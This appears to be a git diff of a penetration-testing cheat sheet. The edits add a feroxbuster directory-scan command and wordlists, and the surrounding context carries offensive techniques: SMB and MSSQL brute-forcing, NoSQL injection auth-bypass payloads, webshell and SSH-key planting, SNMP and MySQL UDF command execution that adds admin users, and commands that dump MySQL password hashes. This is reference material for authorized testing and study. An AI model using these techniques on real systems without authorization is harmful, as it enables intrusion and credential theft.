@@ -402,9 +402,14 @@ ffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -e .p
 ffuf.json | python -m json.tool
 ```
 
+Web Directory discovery with feroxbuster (fast scanner written in Rust)
+
+```bash
+feroxbuster -u http://IP/ -x txt,html,php,YOUR_EXTENSIONS -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+```
+
 Other web discovery tools:
 
-- feroxbuster - fast scanner written in Rust
 - dirb
 - dirbuster
 - wfuzz
@@ -418,7 +423,9 @@ Good wordlists to try:
 - /usr/share/dirbuster/wordlists/directory-list-1.0.txt
 - /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
 - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-
+- /usr/share/seclists/Discovery/Web-Content/common.txt
+- /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+- /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 
 
 ### 2.6.2 Web Credential Bruteforcing
@@ -633,7 +640,6 @@ curl -s  &> /dev/null  0.01s user 0.01s system 14% cpu 0.180 total
 ```
 
 
-
 #### 2.6.3.3 Exploiting NoSQL Injection
 
 In URL query parameters, you put the nested object key or operator in brackets. Here is an example that might work for auth bypass:
@@ -689,7 +695,6 @@ username=admin&password[$regex]=pass.*
 {"username": "admin", "password": {"$regex": "^pas" }}
 ...
 ```
-
 
 
 ### 2.6.4 Directory Traversal
@@ -760,7 +765,6 @@ to use it to (over)write arbitrary files, which may help you get code execution.
 Try:
 - uploading a webshell to the webroot folder
 - adding your ssh key to the `authorized_keys` file
-
 
 
 ### 2.6.5 LFI/RFI
@@ -912,7 +916,6 @@ Kali has more webshells here: `/usr/share/webshells/php/`, and I have some in th
 [Pentestmonkey PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
 
 
-
 ### 2.6.6 Command Injection
 
 Some websites pass user input to a shell execution environment (probably with some filtering).
@@ -981,7 +984,6 @@ Here are common URL query params (or form fields) that may be vulnerable to inje
 ```
 
 
-
 ### 2.6.7 Cross-Site Scripting (XSS)
 
 In all input fields, URL query parameters, and HTTP request headers that get transformed into page content, try the following:
@@ -1039,7 +1041,6 @@ ajaxRequest.open("POST", requestURL, true);
 ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 ajaxRequest.send(params);
 ```
-
 
 
 ### 2.6.8 WordPress
@@ -1116,13 +1117,11 @@ droopescan scan drupal http://$VICTIM_IP -t 32 # if drupal found
 ```
 
 
-
 ### 2.6.10 Joomla
 
 ```sh
 joomscan --ec -u $VICTIM_IP # if joomla found
 ```
-
 
 
 ## 2.7 Kerberos - 88,749
@@ -1152,7 +1151,6 @@ smbclient '\\VICTIM_IP\sharename' -L DC_IP -W DOMAIN -U username%NTHASH --pw-nt-
 ```
 
 
-
 ## 2.8 POP - 110,995
 
 Post Office Protocol (POP) retrieves email from a remote mail server.
@@ -1180,7 +1178,6 @@ RETR 1 # retrieve first email
 ```
 
 
-
 ## 2.9 RPCbind - 111
 
 Gets you list of ports open using RPC services. Can be used to locate NFS
@@ -1203,7 +1200,6 @@ rpcclient $> queryuser 0xrid_ID
 ```
 
 
-
 ## 2.10 NNTP - 119
 
 Network News Transfer Protocol, allows clients to retrieve (read) and post
@@ -1222,7 +1218,6 @@ QUIT
 # http://www.tcpipguide.com/free/t_NNTPCommands-2.htm
 # https://tools.ietf.org/html/rfc977
 ```
-
 
 
 ## 2.11 MSRPC and NetBIOS - 135,137,139
@@ -1288,7 +1283,6 @@ More SIDs
 # can also add creds: [[domain/]username[:password]@]<VictimIP>
 impacket-samrdump -port 139 $VICTIM_IP
 ```
-
 
 
 ## 2.12 SMB - 445
@@ -1402,12 +1396,14 @@ client max protocol = SMB3
 
 Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient` on the command line. However, this 2nd method does not apply to other tools like `enum4linux`
 
+
 ### 2.12.1 SMB Credential Bruteforcing
 
 ```sh
 nmap --script smb-brute -p 445 $VICTIM_IP
 hydra -V -f -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
 ```
+
 
 ### 2.12.2 Interacting with SMB
 
@@ -1437,7 +1433,6 @@ mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
 # try executing a command using wmi (can try psexec by adding '--mode psexec')
 smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
 ```
-
 
 
 ## 2.13 SNMP(s) - 161,162,10161,10162
@@ -1517,6 +1512,7 @@ Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/b
   - snmpd.conf
   - snmp-config.xml
 
+
 ### 2.13.1 Exploring MIBs with `snmptranslate`
 
 From the [`snmptranslate` Tutorial](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):
@@ -1564,6 +1560,7 @@ Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
 
 There is a typo in the file that gets pulled by `snmp-mibs-downloader`. The fix is to replace the existing file with a corrected version, which is located [here](http://pastebin.com/raw/p3QyuXzZ).
 
+
 ### 2.13.2 RCE with SNMP
 
 See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)
@@ -1584,11 +1581,9 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp
 This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)
 
 
-
 ## 2.14 LDAP(s) - 389,636
 
 TODO
-
 
 
 ## 2.15 MSSQL - 1443
@@ -1611,6 +1606,7 @@ See [MSSql Interaction](#4142-mssql-interaction) for how to connect, interact.
 
 The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)
 
+
 ### 2.15.1 MSSQL Credential Bruteforcing
 
 ```sh
@@ -1623,6 +1619,7 @@ nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=user
 ```
 
 More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
+
 
 ### 2.15.2 MSSQL Interaction
 
@@ -1693,6 +1690,7 @@ References:
 - [PayloadsAllTheThings - MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
 - [HackTricks - Pentesting MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
 
+
 ### 2.15.3 MSSQL Command Execution
 
 Simple command execution:
@@ -1742,7 +1740,6 @@ go
 ```
 
 
-
 ## 2.16 NFS - 2049
 
 [HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)
@@ -1784,7 +1781,6 @@ sudo usermod -a -G tempgroup tempuser
 ```
 
 See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
-
 
 
 ## 2.17 MySQL - 3306
@@ -1865,6 +1861,7 @@ use information_schema; select grantee, table_schema, privilege_type from schema
 select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
 ```
 
+
 ### 2.17.1 MySQL UDF Exploit
 
 Exploiting User-Defined Functions in MySQL to get shell execution. First,
@@ -1918,6 +1915,7 @@ select sys_exec("net user derp Herpderp1! /add");
 select sys_exec("net localgroup administrators derp /add");
 ```
 
+
 ### 2.17.2 Grabbing MySQL Passwords
 
 ```sh
@@ -1927,6 +1925,7 @@ cat /etc/mysql/debian.cnf
 # contains all the hashes of the MySQL users (same as what's in mysql.user table)
 grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
 ```
+
 
 ### 2.17.3 Useful MySQL Files
 
@@ -1991,7 +1990,6 @@ net user hacker /del
 # disable remote desktop
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 ```
-
 
 
 ## 2.19 PostgreSQL - 5432
@@ -2111,7 +2109,6 @@ patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fg
 ```
 
 
-
 ## 2.21 MongoDB - 27017
 
 MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
@@ -2168,7 +2165,6 @@ db.users.drop()
 - $regex
 
 
-
 ## 2.22 Amazon Web Services (AWS) S3 Buckets
 
 Format of the bucket and resource (file) in urls:
@@ -2202,6 +2198,7 @@ curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml
 aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
 ```
 
+
 ### 2.22.1 AWS Identity and Access Management (IAM)
 
 Excluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.
@@ -2221,6 +2218,7 @@ initial generation.
 There is another type of credentials, **short-term credentials**, where the
 Access Key ID **begins with the letters `ASIA`** and includes an additional
 string called the Session Token.
+
 
 #### 2.22.1.2 Conducting Reconnaissance with IAM
 
@@ -2259,6 +2257,7 @@ A few other common AWS reconnaissance techniques are:
 
 4. Reveal the encrypted contents of a secret (secrets might be region-specific).
    `aws secretsmanager get-secret-value --secret-id <friendlyname-or-ARN> --profile PROFILENAME [--region eu-north-1]`
+
 
 #### 2.22.1.3 AWS ARNs
 
